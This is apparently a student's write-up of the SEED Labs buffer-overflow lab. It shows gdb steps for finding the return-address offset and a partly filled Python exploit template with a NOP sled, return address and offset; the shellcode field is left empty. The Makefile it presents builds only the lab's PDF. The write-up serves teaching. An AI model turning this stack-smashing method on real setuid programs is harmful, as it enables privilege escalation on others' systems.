# Trabalho realizado na Semana 5 

## Task 1

After compiling and executing the programs, we didn't notice any differences between sheelcode 32 and 64 bits.

## Task 2 

Using the Makefile provided by SeedLabs, we managed to compile in a way that StackGuard and the non-executable stack protection were activated so we could execute the attack.

```Makefile
LAB    = Buffer_Overflow_Setuid
LABPDF = $(LAB).pdf
CF     = ../../common-files
DEPEND = $(CF)/header.tex $(CF)/copyright.tex $(CF)/submission.tex 

all: $(LABPDF)

%.pdf: %.tex $(DEPEND) part_nonexecutable_stack.tex
	pdflatex $<
	pdflatex $<

clean:
	rm -f *.log *.dvi *.aux *.bbl *.blg *~ *.out *.det 
	@@rm -f *~
```

## Task 3

In Task 3, we started by using the gdb so get the distance between the buffer's starting point and the return address. For that, we need the hexadecimal of both of them.

```gdb
$ gdb stack-L1-dbg
```


```gdb
gdb-peda$ b bof ➙ Set a break point at function bof()

```

After that, we `run` the program and the `next` command to go to the bof() function. By stopping inside the bof(), the gbd stops before the ebp register is pointing towards the current stack frame and from there we can find out the distance between the buffer's starting point and the return address.

![](https://i.imgur.com/b9fXQy3.png)

These two values are important, as we will be using them later!
Agora chegou a parte de fazer o ataque onde usamos o código incompleto fornecido pelo professor!
```python
#!/usr/bin/python3
import sys
shellcode= (
	"" # ✩ Need to change ✩
).encode(’latin-1’)

# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 11
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0xffffdfac + 11
offset = 112

L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
##################################################################
```

For the shellcode, we use the code with had from Task 2, shellcode 32 bits.

The `start` variable is a "random" value chosen by the group. `ret` is buffer's starting point + start (11).
The `offset` was calculated by subtracting the buffer's starting point from the $ebp (0xffffdfd8 - 0xffffdfac) and adding 4 because the return address is the address after the $ebp.

After making these alterations, we just need to execute the exploit script to create the badfile and run the gdb.

```gdb
$ gdb stack-L1-dbg
```
![](https://i.imgur.com/lNhvUhi.png)
